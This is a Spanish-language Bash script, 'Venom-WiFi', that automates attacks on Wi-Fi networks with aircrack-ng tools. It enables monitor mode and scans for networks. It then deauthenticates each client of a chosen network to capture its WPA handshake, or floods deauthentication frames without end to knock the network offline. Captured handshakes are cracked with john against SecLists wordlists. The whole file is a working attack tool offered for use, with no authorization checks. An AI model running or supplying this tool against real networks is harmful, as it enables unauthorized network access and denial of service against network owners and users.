#!/bin/bash
#Author: Alcatraz2033

RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')" END="$(printf '\033[0m\e[0m')"

if [ $(id -u) -ne "0" ];then
    echo -e "\n[!]${RED} Ejecute este script como root...${END}"
    exit 1
fi 

function ctrl_c(){
    echo -e "${RED}\n[!] Saliendo...${END}"
	move_file
	rm $cap_name.txt &>/dev/null
    mon=$(networkctl 2>/dev/null |  awk '{print $(NF-3)}' 2>/dev/null)
    mon_comprobation=$(echo $mon | grep "mon")
    if [ $? == "0" ];then
        reverse 2>/dev/null 
    fi 
    exit 1
}

trap ctrl_c INT

function reverse(){
    echo -e "${WHITE}\n[+] ${GREEN}Regresando todo a la normalidad...${END}"
    service NetworkManager start
    service wpa_supplicant start
    lan=$(networkctl 2>/dev/null | grep "mon" | awk '{print $(NF-3)}')
    airmon-ng stop $lan &>/dev/null 
}

function move_file(){
	rm redes* captura-01.csv captura-01.kismet.csv captura-01.kismet.netxml captura-01.log.csv mac_users.txt  2>/dev/null 
	mv captura-01.cap "$red_name.cap" &>/dev/null
	mv "$red_name.cap" capturas  &>/dev/null
	rm "$red_name.cap" &>/dev/null 
}

banner() {
	cat <<- EOF
	
${CYAN}██╗   ██╗███████╗███╗   ██╗ ██████╗ ███╗   ███╗      ██╗    ██╗██╗███████╗██╗
${CYAN}██║   ██║██╔════╝████╗  ██║██╔═══██╗████╗ ████║      ██║    ██║██║██╔════╝██║
${CYAN}██║   ██║█████╗  ██╔██╗ ██║██║   ██║██╔████╔██║█████╗██║ █╗ ██║██║█████╗  ██║
${CYAN}╚██╗ ██╔╝██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║╚════╝██║███╗██║██║██╔══╝  ██║
${CYAN} ╚████╔╝ ███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║      ╚███╔███╔╝██║██║     ██║
${CYAN}  ╚═══╝  ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝       ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝
${MAGENTA}                            By: Alcatraz2033${END}                                                      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	EOF
}

wifi_banner() {
	cat <<- EOF
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${GREEN}	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡾⠃⠀⠀⠀⠀⠀⠀⠰⣶⡀⠀⠀
${GREEN}	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡿⠁⣴⠇⠀⠀⠀⠀⠸⣦⠈⢿⡄⠀
${GREEN}	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡇⢸⡏⢰⡇⠀⠀⢸⡆⢸⡆⢸⡇⠀ 
${GREEN}	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡇⠘⣧⡈⠃⢰⡆⠘⢁⣼⠁⣸⡇⠀ 
${GREEN}	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣄⠘⠃⠀⢸⡇⠀⠘⠁⣰⡟⠀⠀${RED}Handshake Capturado:${CYAN} $red_name
${GREEN}	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠃⠀⠀⢸⡇⠀⠀⠘⠋⠀⠀⠀
${GREEN}	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀
${GREEN}	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀
${GREEN}	⠀⠀By: Alcatraz2033⠀⠀⠀⠘⠃⠀⠀⠀⠀⠀⠀⠀
${GREEN}	⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀
${GREEN}	⠀⢸⣿⣟⠉⢻⡟⠉⢻⡟⠉⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀
${GREEN}	⠀⢸⣿⣿⣷⣿⣿⣶⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀
${GREEN}	⠀⠈⠉⠉⢉⣉⣉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⣉⣉⡉⠉⠉⠁⠀
${GREEN}	⠀⠀⠀⠀⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉ ${END}⠀⠀⠀⠀
	EOF
}

function cheker(){

	which aircrack-ng &>/dev/null
	if [ $? -ne "0" ];then
		echo -e "\n[+]${CYAN} Instalando aircrack-ng...${END}"
		sudo apt install aircrack-ng -y &>/dev/null
	fi
	which xterm &>/dev/null
	if [ $? -ne "0" ];then
		echo -e "\n[+]${CYAN} Instalando xterm...${END}"
		sudo apt install xterm -y &>/dev/null
	fi 
	which john &>/dev/null
	if [ $? -ne "0" ];then
		echo -e "\n[+]${CYAN} Instalando john...${END}"
		sudo apt install john -y &>/dev/null
	fi
	which git &>/dev/null
	if [ $? -ne "0" ];then
		echo -e "\n[+]${CYAN} Instalando git...${END}"
		sudo apt install git -y &>/dev/null
	fi
	if [ ! -d "SecLists" ];then
		echo -e "\n[+]${CYAN} Descargando SecLists, esto puede demorar un poco...${END}"
		git clone https://github.com/danielmiessler/SecLists.git 
	fi 
}

function hand_checker(){
	while true; do
		len=$(ls -la | awk '/captura-01.cap/{print $5}')
		if [ ${#len} -eq 6 ];then
			pkill xterm
			clear; wifi_banner
			move_file
		    mon=$(networkctl 2>/dev/null |  awk '{print $(NF-3)}' 2>/dev/null)
		    mon_comprobation=$(echo $mon | grep "mon")
		    if [ $? == "0" ];then
		        reverse 2>/dev/null 
		        exit 1
		    fi 
		else
			break
		fi
	done
}

# EN PROCESO...
# dictionary_crack(){
	# aircrack-ng "capturas/$red_name.cap" -J "capturas/$red_name" &>/dev/null
	# hccap2john "capturas/$red_name.hccap" > "capturas/$red_name.txt"
	# rm capturas/*.hccap
	# echo "${WHITE}[+] ${GREEN}Ataque por diccionario:${WHITE}"
# 
	# select k in 'Utilizar diccionario automatico' 'Utilizar diciconario propio';do
		# if [[ $k == 'Utilizar diccionario automatico' ]];then
			# for elemento in $(ls SecLists/Passwords/WiFi-WPA/);do
				# john --wordlist=SecLists/Passwords/WiFi-WPA/$elemento "capturas/$red_name.txt"
			# done
		# fi
		# if [[ $k == 'Utilizar diciconario propio' ]];then
			# read -r -p "Ruta del diccionario: " diccionario
			# john --wordlist=$diccionario "capturas/$red_name.txt"
		# else
			# echo -e "\n[+]${CYAN} Opcion incorrecta${END}"
		# fi
	# done
# }

menu_dicitionary_crack(){
	select cap in $(ls capturas);do
		large=$(ls -la capturas | grep $cap | awk '{print $5}')
		cap_name=$(echo $cap | sed 's/.cap//g')
		if [ ${#large} -eq 6 ];then
			aircrack-ng "capturas/$cap_name.cap" -J "capturas/$cap_name" &>/dev/null
			hccap2john "capturas/$cap_name.hccap" > "capturas/$cap_name.txt"
			rm capturas/*.hccap
			echo -e "\n${WHITE}[+] ${GREEN}Escoja una opcion:${END}"
			select j in 'Utilizar diccionario automatico' 'Utilizar diciconario propio';do
				if [[ $j == 'Utilizar diccionario automatico' ]];then
					for elemento in $(ls SecLists/Passwords/WiFi-WPA/);do
						jhon_process=$(john --wordlist=SecLists/Passwords/WiFi-WPA/$elemento "capturas/$cap_name.txt")
						echo $jhon_process | grep "No password hashes left to crack" &>/dev/null
						if [ $? -eq 0 ];then
							pass=$(john --show capturas/$cap_name.txt | head -n1 | awk -F ":" 'BEGIN{FS=":";OFS=" -> "} {print $1,$2}')
							echo -e "\n[+]${CYAN} Contraseña encontrada: ${END}$pass"
							break
						else
							echo $jhon_process 
						fi
					done
				fi
				if [[ $j == 'Utilizar diciconario propio' ]];then
					read -r -p "Ruta del diccionario: " diccionario
					john --wordlist=$diccionario "capturas/$cap_name.txt"
				fi
			done
		else
			echo -e "[+]${CYAN} $cap no tiene handshake${END}"
		fi

	done
}


process(){
	if [ ! -d "capturas" ];then
		mkdir capturas
	fi	

	interf=$(networkctl 2>/dev/null | awk '/unmanaged/{print $2}')
	echo -e "\n${WHITE}[+] ${GREEN}Escoja la interfaz a poner en modo monitor${END}"
	select option in $interf;do
	    echo -e "${WHITE}\n[+] ${GREEN}Matando procesos secundarios...${END}"
	    airmon-ng check kill &>/dev/null
	    echo -e "${WHITE}[+] ${GREEN}Iniciando $option en modo monitor...${END}"
	    airmon-ng start $option &>/dev/null
	    lan=$(networkctl 2>/dev/null | grep "mon" | awk '{print $(NF-3)}')
	    echo "${WHITE}[+] ${GREEN}Modo monitor activado:${END} $lan"
	    break
	done 

	echo -e "${WHITE}[+] ${GREEN}Listando redes WIFI${END}"
	sleep 1

	clear 
	lan=$(networkctl 2>/dev/null | grep "mon" | awk '{print $(NF-3)}')
	xterm -hold -title "Redes Wifi" -e "airodump-ng $lan -w redes"
	echo -e "\n${WHITE}[+] ${GREEN}Redes wifi encontradas, seleccione una${END}\n"
	eleccion=$(awk -F',' '{print $14}' redes-01.csv | sed 's/ESSID//' | tr -s '\n' | sort | sed '/^\s*$/d' | sed 's/ //' | sed 's/ /\//g')

	select optiones in $eleccion;do
	    red_name=$(echo $optiones | sed 's/\// /g')
	    bssid=$(cat redes-01.csv | awk "/$red_name/{print \$1}" | head -n 1 | tr -d ',')
	    channel=$(cat redes-01.csv | awk "/$red_name/{print \$6}" | head -n 1 | tr -d ',')
	    break
	done 


	echo -e "\n${WHITE}[+] ${GREEN}Seleccione un modo de ataque${END}"
	select ataque in 'Obtener handshake' 'Tumbar la red';do

		if [[ $ataque == "Obtener handshake" ]];then

			xterm -hold -title "Capturando Paquetes" -e "airodump-ng -c $channel --bssid $bssid -w captura $lan" &
			rm redes*

			echo -e "\n${WHITE}[!] ${GREEN}Una vez obtenido el handshake revise la carpeta 'capturas'${END}"
			echo -e "[!]${RED} Precione Ctrl_C para salir...${END}"
			sleep 3
			while true;do     
			    awk -F',' '{print $1}' captura-01.csv | tail -n+6 | sort | sed '/^\s*$/d' > mac_users.txt 
			    if [ -s mac_users.txt ];then
			        awk -F',' '{print $1}' captura-01.csv | tail -n+6 | sort | sed '/^\s*$/d' > mac_users.txt
			        for i in $(cat mac_users.txt);do 
			            xterm -hold -title "Desautenticando" -e "aireplay-ng -0 4 -a $bssid -c $i $lan" &
			            sleep 4
			            pid=$(pidof xterm | awk '{print $1}') &>/dev/null
			            kill -9 $pid &>/dev/null
			            hand_checker
			        done 
			    fi 
			done 2>/dev/null
			
		else
			xterm -hold -title "Redes Wifi" -e "airodump-ng -c $channel --bssid $bssid -w captura $lan" &
			xterm -hold -title "Desautenticando" -e "aireplay-ng -0 0 -a $bssid $lan" &
			rm redes*
			echo
			while true;do
				echo -e "${CYAN}[+] ${WHITE}Tumbando la red: $red_name${END}"
				sleep 1
			done
		fi
	done
}


clear 
banner
cheker

echo -e "${WHITE}[+] ${GREEN}Escoja una opcion:${END}"
PS3=">>> "
select x in 'Atacar la red' 'Crackear contraseña';do
	if [[ $x == 'Atacar la red' ]];then
		process
	elif [[ $x == 'Crackear contraseña' ]];then
		echo -e "\n${WHITE}[+] ${GREEN}Escoja un archivo.cap a crackear${END}"
		menu_dicitionary_crack
	fi

done
